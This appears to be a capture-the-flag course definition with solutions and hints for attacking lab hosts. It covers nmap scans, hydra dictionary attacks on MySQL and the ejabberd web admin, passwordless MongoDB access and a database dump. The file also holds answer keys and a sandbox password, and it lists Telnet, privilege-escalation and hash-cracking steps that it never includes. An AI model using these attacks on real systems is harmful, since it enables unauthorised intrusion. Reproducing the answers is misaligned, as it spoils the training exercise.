title: MongoDB, MySQL & Ejabberd Attack Training
description: Hands-on cybersecurity training covering network reconnaissance, MySQL brute-force, MongoDB unauthenticated access, Telnet password guessing, privilege escalation, and XMPP/ejabberd service attacks.
outcomes: Enumerating XMPP services running on ejabberd
Brute-forcing ejabberd web admin and MySQL via phpMyAdmin
Dumping and cracking ejabberd user password hashes
Retrieving a flag from a misconfigured XMPP server

levels.title: Info
levels.content:
# MongoDB, MySQL & Ejabberd Attack Training

Welcome to this hands-on cybersecurity training on the NASTP CyberRangeCZ Platform.

**Note**: It is recommended to use the Chrome browser. In case you run into difficulties with submitting the answer, try to Log out and Log in again.

| Level | Level Name | Level Type |
|:------:|------| ------ |
| 1. | Info | Info |
| 2. | Get Access | Access |
| 3. | Network Reconnaissance | Training |
| 4. | MySQL Password Brute-Force | Training |
| 5. | MongoDB Unauthenticated Access | Training |
| 6. | Telnet Password Guessing | Training |
| 7. | Privilege Escalation | Training |
| 8. | Ejabberd Recon | Training |
| 9. | Ejabberd Web Admin Attack | Training |
| 10. | Ejabberd MySQL Dump | Training |
| 11. | Ejabberd Flag Capture | Training |
| 12. | Final Assessment | Assessment |

## Topology

| Host | IP | Services |
|------|----|----------|
| kali (attacker) | 192.168.30.10 | — |
| server | 192.168.20.5 | Telnet :2323 |
| db-server | 192.168.40.5 | MySQL :3306, MongoDB :27017 |
| ejabberd-server | 192.168.20.10 | XMPP :5222, Admin :5280, HTTP :80, MySQL :3306 |

**Leading author:** Zeeshan Khan

levels.title: Get Access
levels.cloud_content:
Your first task is to access the sandbox where you will complete all following tasks. After you have successfully connected, submit the answer **`start`**.

### Sandbox Access
1. In the topology overview on the right, right-click on **`kali`** and then click on **`Open console`**.
2. Login with username **`debian`** and password **`Kali@1234`**.

Alternatively, you can use SSH to connect to the machine. See [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for more details.

### Network Overview
| Host | IP Address |
|------|------------|
| kali (you are here) | 192.168.30.10 |
| server | 192.168.20.5 |
| db-server | 192.168.40.5 |
| ejabberd-server | 192.168.20.10 |
levels.local_content: This sandbox has not been tested for use with local sandbox.

levels.title: Network Reconnaissance
levels.content:
Your goal is to discover what services are running on **`db-server`** (`192.168.40.5`).

Use **nmap** to scan the target and identify open ports. The answer is the two open port numbers separated by a comma (e.g. `3306,27017`).
levels.solution:
1. Run the following command from the Kali machine:

   **`nmap -sV -p 3306,27017 192.168.40.5`**

2. You will see two open ports:
   - **3306** — MySQL database
   - **27017** — MongoDB database

3. Enter **`3306,27017`** as the answer.

hints.title: Which tool to use
hints.content: Use **nmap** to scan for open ports. Try **`nmap -sV -p- 192.168.40.5`** to scan all ports with version detection.

hints.title: Targeted scan
hints.content: If a full scan is too slow, target common database ports: **`nmap -sV -p 3306,27017 192.168.40.5`**

levels.title: MySQL Password Brute-Force
levels.content:
You have discovered MySQL running on **`db-server`** (`192.168.40.5:3306`).

You know the username is **`dbuser`** but not the password. Use a dictionary attack to find it.

A wordlist is available at `/usr/share/wordlists/rockyou.txt`.

Once you have the credentials, connect to MySQL and retrieve the flag from the **`company`** database.
levels.solution:
1. Run hydra to brute-force the MySQL password:

   **`hydra -l dbuser -P /usr/share/wordlists/rockyou.txt mysql://192.168.40.5`**

2. Connect to MySQL:

   **`mysql -h 192.168.40.5 -u dbuser -p`**

3. Retrieve the flag:

   **`USE company;`**
   **`SELECT * FROM employees;`**

4. The flag is in the **`secret`** column. Submit it as the answer.

hints.title: Brute-force tool
hints.content:
Use **hydra** for the brute-force attack:
**`hydra -l dbuser -P /usr/share/wordlists/rockyou.txt mysql://192.168.40.5`**

hints.title: Connecting to MySQL
hints.content:
Once you have the password, connect using:
**`mysql -h 192.168.40.5 -u dbuser -p`**
Then run: `USE company;` and `SELECT * FROM employees;`

levels.title: MongoDB Unauthenticated Access
levels.content:
You have also discovered **MongoDB** running on **`db-server`** (`192.168.40.5:27017`).

This MongoDB instance is **misconfigured** — it has no authentication enabled. Connect directly and retrieve the flag from the **`records`** database.
levels.solution:
1. Connect to MongoDB directly (no credentials needed):

   **`mongosh --host 192.168.40.5 --port 27017`**

2. Switch to the records database and find the flag:

   **`use records`**
   **`db.flags.find()`**

3. Submit the flag value as the answer.

hints.title: Connecting to MongoDB
hints.content:
Use **mongosh** to connect:
**`mongosh --host 192.168.40.5 --port 27017`**
No username or password is required.

levels.title: Ejabberd Recon
levels.content:
A new target has appeared: **`ejabberd-server`** (`192.168.20.10`).

This machine runs an **XMPP messaging server** (ejabberd). Use **nmap** to scan it and identify the two main ejabberd ports:
- The standard XMPP client port
- The ejabberd HTTP admin/API port

Submit the two open port numbers separated by a comma (lower number first).
levels.solution:
1. Run a targeted nmap scan:

   **`nmap -sV -p 5222,5280 192.168.20.10`**

2. Both ports will show as open:
   - **5222** — XMPP client-to-server (ejabberd)
   - **5280** — ejabberd HTTP admin panel

3. Submit **`5222,5280`** as the answer.

hints.title: Common ejabberd ports
hints.content: XMPP servers typically listen on port **5222** for client connections and **5280** for the HTTP admin interface.

levels.title: Ejabberd Web Admin Attack
levels.content:
The ejabberd server exposes a **web admin panel** at `http://192.168.20.10:5280/admin`.

The admin username is **`admin@192.168.20.10`**. Use a dictionary attack to find the password.

A custom wordlist for this target is available at `/home/debian/ejabberd-passwords.txt`.

Once you have successfully authenticated to the admin panel, find the **registered users** page and submit the **number of registered users** as the answer.
levels.solution:
1. Brute-force the ejabberd admin HTTP Basic auth:

   **`hydra -l admin@192.168.20.10 -P /home/debian/ejabberd-passwords.txt -s 5280 192.168.20.10 http-get /admin`**

2. Open the admin panel in Firefox:

   **`http://192.168.20.10:5280/admin`**

3. Log in with the discovered password.

4. Navigate to **Virtual Hosts → 192.168.20.10 → Users**.

5. Count the registered users and submit the number as the answer.

hints.title: Finding users in the panel
hints.content: After logging in, go to: **Virtual Hosts → 192.168.20.10 → Users**

levels.title: Ejabberd MySQL Dump
levels.content:
The ejabberd server stores all user accounts and messages in a **MySQL database** on the same host (`192.168.20.10:3306`).

The database name is **`ejabberd`** and the MySQL user is **`ejabberd`**.

You need to:
1. Connect to the MySQL database (the password is the one you found in the previous level or try `/home/debian/ejabberd-passwords.txt`).
2. Dump the **`users`** table from the `ejabberd` database.
3. Submit the **username** of the non-admin account you find.
levels.solution:
1. Connect to MySQL on ejabberd-server:

   **`mysql -h 192.168.20.10 -u ejabberd -p`**
   (use the password found from brute-forcing)

2. Query the users table:

   **`USE ejabberd;`**
   **`SELECT username FROM users;`**

3. You will see the registered XMPP accounts. Submit the non-admin username.

hints.title: Connecting to MySQL remotely
hints.content:
Run: **`mysql -h 192.168.20.10 -u ejabberd -p`**
The ejabberd database allows remote connections.

hints.title: Listing users
hints.content:
Once connected:
**`USE ejabberd;`**
**`SELECT username FROM users;`**

levels.title: Ejabberd Flag Capture
levels.content:
The final flag on the ejabberd server is hidden inside the **ejabberd configuration file**.

Using the credentials you have gathered, SSH into the ejabberd server and read the flag.

- Host: `192.168.20.10`
- SSH user: `contestant` (password provided by your instructor)
- The flag is a comment at the end of `/etc/ejabberd/ejabberd.yml`

Submit the full flag string as the answer.
levels.solution:
1. SSH into the ejabberd server:

   **`ssh contestant@192.168.20.10`**

2. Read the ejabberd configuration file and find the flag:

   **`sudo grep 'FLAG' /etc/ejabberd/ejabberd.yml`**

   Or read the full file:

   **`sudo cat /etc/ejabberd/ejabberd.yml | grep FLAG`**

3. The flag looks like: `FLAG{...}`

4. Submit the flag as the answer.

levels.title: Final Assessment
levels.instructions: Answer the following questions to complete the training.

questions.text: Which tool did you use to brute-force the MySQL password?
Why was MongoDB accessible without a password?

choices.text: The MongoDB instance was misconfigured with no authentication

questions.text: Match each attack with the correct tool used.
What sudo command allowed privilege escalation to root?
On which port does ejabberd expose its HTTP admin panel by default?
Where was the ejabberd flag hidden on the server?
